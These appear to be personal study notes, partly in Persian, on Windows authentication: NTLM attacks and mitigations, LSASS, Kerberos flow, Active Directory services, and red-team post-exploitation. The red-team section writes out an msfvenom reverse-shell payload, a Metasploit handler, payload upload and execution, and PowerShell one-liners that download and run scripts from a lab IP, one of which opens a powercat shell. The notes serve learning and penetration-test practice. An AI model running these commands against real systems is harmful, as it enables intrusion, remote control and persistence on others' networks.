| ----------------------------------------- | ------------------------------- | --------------------------------------------------------------------------------------------------------- |
| **Negotiation** (Negotiate Message)       | Man-in-the-Middle (MitM) Attack | An attacker can intercept and manipulate messages to weaken security features, such as disabling signing. |
|                                           | Downgrade Attack                | Forces the protocol from NTLMv2 to NTLMv1, exposing it to weaker encryption and easier exploitation.      |
| **Challenge** (Challenge Message)         | NTLM Relay Attack               | Relays the challenge to another server, impersonating the user to authenticate on the relayed server.     |
|                                           | Pass-the-Hash (PTH) Attack      | Uses an NTLM hash to respond to the challenge, bypassing the need for the plaintext password.             |
| **Authentication** (Authenticate Message) | Pass-the-Hash (PTH) Attack      | Allows attackers with the NTLM hash to authenticate without knowing the actual password.                  |
|                                           | Credential Forwarding           | Reuses captured session credentials for lateral movement or further authentication within the network.    |

### Mitigations for NTLM Authentication Attacks

- **Disable NTLM where possible**: Use Kerberos or other stronger authentication protocols instead.
- **Enforce NTLM Signing and Require NTLMv2**: Signing prevents message tampering, and NTLMv2 offers stronger security.
- **Limit Credential Exposure**: Use tools like Windows Defender Credential Guard to protect NTLM hashes in memory.
- **Use Multi-Factor Authentication (MFA)**: MFA can help secure logins even if NTLM hashes are compromised.
- **Regular Monitoring and Auditing**: Watch for unusual authentication attempts and NTLM relay activity to detect potential attacks.

By understanding and securing each step, organizations can reduce the risk of NTLM-based attacks and strengthen overall network security.




The **Local Security Authority Subsystem Service (LSASS)** plays a crucial role in the authentication process in Windows operating systems, particularly for protocols like **Kerberos** and **NTLM**. Understanding how LSASS operates in user mode and kernel mode is important for grasping the security architecture of Windows authentication.

### How LSASS Works in Authentication

1. **User Mode vs. Kernel Mode**:
    
    - **User Mode**: This is the mode in which most user applications and services run. Processes in user mode have restricted access to system resources and cannot directly access hardware or reference kernel memory. Instead, they communicate with the kernel via system calls.
    - **Kernel Mode**: This mode has full access to all hardware and system resources. Kernel mode is where core components of the operating system run, including drivers and the Windows kernel itself. Processes running in kernel mode can directly manipulate hardware and memory.
2. **LSASS Functionality**:
    
    - LSASS runs as a service in user mode on Windows systems and is responsible for enforcing the security policy on the system, including user authentication and Active Directory interactions.
    - LSASS handles both Kerberos and NTLM authentication requests. When a user attempts to log in or an application tries to authenticate, the following processes occur:

### Kerberos Authentication Flow

1. **TGT Request (AS-REQ)**:
    
    - When a user logs in, their credentials (username and password) are sent to the **Key Distribution Center (KDC)** in a request for a **Ticket Granting Ticket (TGT)**. This request is processed by LSASS in user mode.
    - If successful, the KDC returns a TGT and a session key, which LSASS receives and stores in memory.
2. **Ticket Request (TGS-REQ)**:
    
    - The user/application requests access to a specific service by presenting the TGT to the KDC for a service ticket. LSASS facilitates this request.
3. **Service Request (AP-REQ)**:
    
    - Once the service ticket is obtained, the application presents it to the requested service for authentication, and the service verifies it using LSASS.

### NTLM Authentication Flow

1. **Initial Challenge**:
    
    - When a user attempts to access a resource, the server issues a challenge to the client, which is then passed to LSASS.
2. **Response**:
    
    - LSASS uses the user’s password hash to create a response to the challenge, which is sent back to the server for verification. This process occurs in user mode as LSASS interacts with user credentials stored in the Security Account Manager (SAM) database.

### Interaction Between User Mode and Kernel Mode

- **System Calls**: When LSASS needs to perform an operation that requires higher privileges (like accessing hardware resources or interacting with kernel-mode components), it makes system calls. This is how it transitions from user mode to kernel mode.
- **Driver Interactions**: If LSASS requires assistance from kernel-mode drivers (for example, when managing certain security features or accessing secure storage), it communicates with these drivers through well-defined interfaces.
- **Memory Protection**: To maintain security, LSASS and the Windows OS enforce strict memory protection. Sensitive data (like passwords and ticket secrets) are kept in memory with protections to prevent access from other user-mode processes.

### Security Implications

- **Vulnerabilities**: Since LSASS runs in user mode, if an attacker can compromise the LSASS process (e.g., through malware), they may gain access to sensitive authentication tokens, passwords, or even execute code that escalates privileges.
- **Defense Mechanisms**:
    - Windows implements various security measures to protect LSASS, including protections against credential dumping (like **LSA Protection**) and running LSASS as a protected process to limit access from unauthorized processes.

### Summary

- **LSASS operates in user mode** and is responsible for handling Kerberos and NTLM authentication.
- It interacts with kernel mode through system calls when higher privileges are necessary, ensuring a separation of concerns and security boundaries.
- Understanding this interaction is crucial for both system administrators and security professionals in safeguarding against potential attacks targeting the authentication processes in Windows environments.



### Penetration Testing and Red Teaming Scenarios

In real-world scenarios, achieving the goals of a penetration test or red teaming project can typically be approached in two ways:

1. Exploiting services
2. Social engineering

### Attack Surface for Enterprise Organizations

Enterprise organizations have numerous services that can serve as attack surfaces. Examples include:

- Web applications / APIs
- Jenkins
- GitLab
- CRM systems
- Microsoft Exchange
- SharePoint
- VPNs
- And more...

### Penetration Testing Approach

A penetration tester typically follows OWASP methodologies when targeting web applications or APIs. For instance, a tester might exploit vulnerabilities in a web application, upload a web shell, and conclude the penetration testing project once the web shell has been successfully uploaded.

**Penetration Test Process (Simplified):**

1. Identify and exploit web application vulnerabilities.
2. Upload a web shell.
3. Validate access and document findings in the final report.

---

### Red Teaming Approach

For red teamers, the work often begins **after** the web shell is uploaded. Unlike penetration testing, red teaming involves simulating a more sophisticated, adversarial attack aimed at achieving deeper access and persistence within the network.

#### Initial Access and Challenges

1. **Workgroup vs Domain:**
    
    - If the target web server is in a workgroup, gaining access to the domain becomes a priority. This may involve finding credentials or pivoting through lateral movement.
    - If the server is already part of a domain, the focus shifts to escalating privileges and moving laterally within the domain.
2. **Privilege Levels:**
    
    - Initial access might be as a low-privileged user, but due to common misconfigurations, elevated privileges such as `SYSTEM` or `root` might be achievable. For example:
        - Uploading a web shell might provide immediate access to the `NT SYSTEM` account.

#### Example Misconfiguration: Database Credentials

Often, sensitive configuration files such as `web.config` in IIS web servers (located in `C:\inetpub\wwwroot\webapplicationpath\`) contain database connection strings. For example:

```
<connectionStrings>
    <add name="DBConnectionString" connectionString="Data Source=SQLSERVER;Initial Catalog=MyDatabase;User ID=sa;Password=password123" />
</connectionStrings>

```

In this case:

- The `sa` user and password could allow direct access to the SQL database.
- If the SQL server runs as `NT SYSTEM`, commands can be executed with elevated privileges using tools like `xp_cmdshell`.

### Assumed Breach Methodology

The **Assumed Breach** methodology is popular for red teaming. This approach skips the reconnaissance, resource development, and initial access tactics from the MITRE ATT&CK framework, assuming instead that the network is already compromised.

#### Example Scenario:

1. After gaining domain admin privileges, you might need to access an internal service such as RDP (port 3389). If the firewall does not allow external access, port forwarding tools such as `tunna` or the Metasploit `portforward` module can help.

#### Using Metasploit for Port Forwarding:

 Create a Meterpreter payload:
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.174.147 LPORT=1234 -f aspx -o shell.aspx
```

Start a Metasploit handler:

```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.174.147
set LPORT 1234
run

```

Perform post-exploitation tasks for instances:
Enable SOCKS proxy:

```
run post/multi/manage/socks_proxy
```


Scan for open ports:

```
run post/multi/gather/portscan
```

Upload long-haul backdoors, such as Cobalt Strike payloads:

```
upload <payload_file> C:\temp\payload.exe 
execute -f C:\temp\payload.exe
```


### Post-Exploitation Discovery

Through the web shell, various **PowerShell commands** can be used for information gathering (discovery). Examples include:

#### Gathering Domain Information:

```
$env:USERDNSDOMAIN
(Get-ADDomain).DNSRoot
(Get-WmiObject Win32_ComputerSystem).Domain
Get-ADDomain | select DNSRoot, NetBIOSName, DomainSID
Get-ADForest
nltest /domain_trusts

```

#### Downloading and Running Scripts In-Memory:

PowerShell allows downloading and executing scripts in-memory, which is useful for evasion. Examples include using tools like Nishang and PowerCat:

```
powershell -c iex ((New-Object Net.WebClient).DownloadString('http://192.168.174.147/Get-Information.ps1')); Get-Information

```

```
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://192.168.174.147/powercat.ps1')); powercat -l -p 443 -e cmd

```


مدل ادرس دهی در AD


![[Screenshot 2025-07-28 203926.png]]




registr schema ====> win + r ====>  regsvr32 schemmgmt.dll

win + r ====> mmc ---> active directory schema add 



اکتیو دایرکتوری یک خانواده پنج نفره هست که کدوم در بستر یک شبکه دامین فرایندی رو پیش رو میبرن 

ADDS --> **Domain Services**
ADCS --> **Certificate Services**
ADLDS --> **Lightweight Directory Services**
ADFS --> **Directory Federation Services**
ADRMS --> **Rights Management**



**Domain Services یا AD DS**:
ذخیره متمرکز دیتا و مدیریت ارتباطات بین کاربران و دامین ها را بر عهده دارد. همچنین احراز هویت هنگام لاگین و سرچ را انجام می‌دهد.

**Certificate Services یا AD CS**:
گواهینامه های امن را ایجاد و مدیریت می‌کند و به اشتراک می‌گذارد. گواهینامه از رمزگذاری استفاده می‌کند تا اطلاعات را روی اینترنت به صورت امن جابجا کند.


**Lightweight Directory Services یا AD LDS**: 
پشتیبانی از دایرکتوری ها و فراهم کردن امکان استفاده برنامه ها از پروتکل LDAP را بر عهده دارد. LDAP پروتکلی است که برای دسترسی و نگهداری سرویس های دایرکتوری روی شبکه استفاده می‌شود. LDAP آبجکت هایی مانند نام کاربری و پسورد را در سرویس های دایرکتوری (مثل اکتیو دایرکتوری) ذخیره می‌کنند و آن را روی شبکه به اشتراک می‌گذارد.

**Directory Federation Services یا AD FS:**
وظیفه آن بررسی دسترسی کاربر به برنامه ها است حتی روی چند شبکه. برای این کار از Single Sign On – SSO استفاده می‌کند. برای احراز هویت کاربر در چندین برنامه، SSO را در یک نشست فراهم می‌کند. یعنی چه؟ یعنی SSO فقط لازم دارد که کاربر یکبار لاگین کند نه اینکه برای هر سرویس، احراز هویت مختص آن انجام شود.

**Rights Management یا AD RMS:**
قانون کپی رایت را برای جلوگیری از استفاده غیرمجاز و توزیع محتوای دیجیتالی اجرا می‌کند. یعنی حقوق اطلاعات را کنترل و مدیریت می‌کند. چگونه؟ با رمزگذاری محتوا روی سرور با دسترسی محدود مانند اسناد ورد یا ایمیل.